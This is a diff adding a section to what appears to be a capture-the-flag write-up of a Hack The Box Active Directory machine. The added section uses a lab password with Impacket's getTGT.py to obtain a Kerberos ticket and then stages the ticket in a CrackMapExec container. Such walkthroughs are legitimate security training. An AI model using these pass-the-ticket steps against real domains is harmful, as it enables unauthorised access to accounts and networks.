@@ -595,6 +595,42 @@ SMB         10.129.228.64   445    DC               [-] absolute.htb\n.smith:Dar
 
 <mark style="color:yellow;">How else can we authenticate?</mark>
 
+We have Kerberos open. Remembering that Kerberos is an authentication protocol, this seems like the most realistic approach to start doing some research.
+
+{% embed url="https://www.thehacker.recipes/ad/movement/kerberos/ptk" %}
+
+### PassTheKey (GetTGT.py)
+
+```
+getTGT.py 'absolute.htb/d.klay:Darkmoonsky248girl' -dc-ip absolute.htb 
+Impacket v0.10.1.dev1+20230505.184149.c309363e - Copyright 2022 Fortra
+
+[*] Saving ticket in d.klay.ccache
+                                                                                                         
+export KRB5CCNAME=/home/user/Desktop/HTB/Absolute/d.klay.ccache
+```
+
+Now that we have this ticket, we can use it to authenticate to different protocols via Kerberos.
+
+I know just the tool for this, CME!
+
+### CrackMapExec Kerberos Authentication
+
+Start CME docker:
+
+```
+sudo docker build -t cme .
+sudo docker run -it --entrypoint=/bin/bash --rm --name cmexec cme:latest
+```
+
+Transfer ticket to CME Docker container:
+
+Open a new terminal window and run.
+
+```
+sudo docker cp d.klay.ccache cmexec:/usr/src/crackmapexec/d.klay.ccache
+```
+
 ## Privilege Escalation
 
 ### Local enumeration
